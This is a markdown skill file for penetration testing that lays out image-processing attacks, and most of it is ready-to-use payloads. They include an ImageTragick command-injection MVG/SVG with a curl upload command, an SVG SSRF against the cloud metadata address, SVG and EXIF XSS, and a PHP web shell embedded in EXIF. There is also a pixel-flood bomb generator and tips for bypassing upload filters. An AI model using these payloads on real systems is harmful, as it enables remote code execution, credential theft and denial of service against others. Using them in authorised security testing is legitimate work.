---
name: image-processing-attacks
description: Image processing vulnerabilities including ImageTragick, SVG SSRF/XSS, polyglot files, EXIF injection, and pixel flood attacks
---

# Image Processing Attacks

When applications process uploaded images (resize, convert, generate thumbnails), the image processing library can be exploited for RCE (ImageMagick/ImageTragick), SSRF (SVG), XSS (SVG), and DoS (pixel flood/decompression bombs).

## Key Vulnerabilities

### ImageTragick (CVE-2016-3714)

```bash
# Create malicious MVG file (ImageMagick exploit)
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context
EOF

# Create malicious SVG
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://example.com/image.jpg&quot;|id &quot;" x="0" y="0" height="640" width="480"/>
</svg>
EOF

# Upload and check for RCE
curl -sk https://TARGET/upload -F "file=@exploit.mvg;type=image/svg+xml"
```

### SVG SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="200" height="200"/>
</svg>
```

### SVG XSS

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="10" y="30">XSS via SVG</text>
</svg>
```

### Pixel Flood DoS

```python
# Create decompression bomb — tiny file, huge dimensions
from PIL import Image
img = Image.new('RGB', (100000, 100000), color='red')
img.save('bomb.png', 'PNG')
# Upload — server tries to allocate ~30GB RAM for pixel buffer
```

### EXIF Data Injection

```bash
# Inject XSS payload into EXIF comment
exiftool -Comment='<script>alert(1)</script>' image.jpg
# If app displays EXIF data without sanitization → XSS

# Inject PHP code into EXIF for LFI chains
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
```

## Testing Methodology

1. **Identify image processing** — upload, resize, thumbnail generation, avatar, profile picture
2. **Upload SVG** — test for SSRF and XSS via SVG XML injection
3. **Test ImageMagick** — upload MVG/SVG with command injection payloads
4. **Test decompression bombs** — large dimension images, ZIP bombs disguised as images
5. **Test EXIF injection** — embed payloads in EXIF metadata fields

## Impact

- **Critical**: RCE via ImageTragick on unpatched ImageMagick
- **High**: SSRF via SVG processing → cloud metadata theft
- **Medium**: Stored XSS via SVG upload served to other users
- **Medium**: DoS via decompression bombs

## Pro Tips

1. SVG is XML — test for XXE, SSRF, and XSS simultaneously when SVG upload is allowed
2. Even if `.svg` is blocked, try uploading SVG with `.jpg` extension — some processors detect format by magic bytes
3. ImageMagick delegates processing to external binaries (ghostscript, ffmpeg) — each has its own vulnerabilities
4. Test EXIF injection on profile pictures — if original EXIF is displayed, XSS may be possible
5. Polyglot files (valid JPEG + valid PHP) can bypass upload restrictions and achieve code execution via LFI
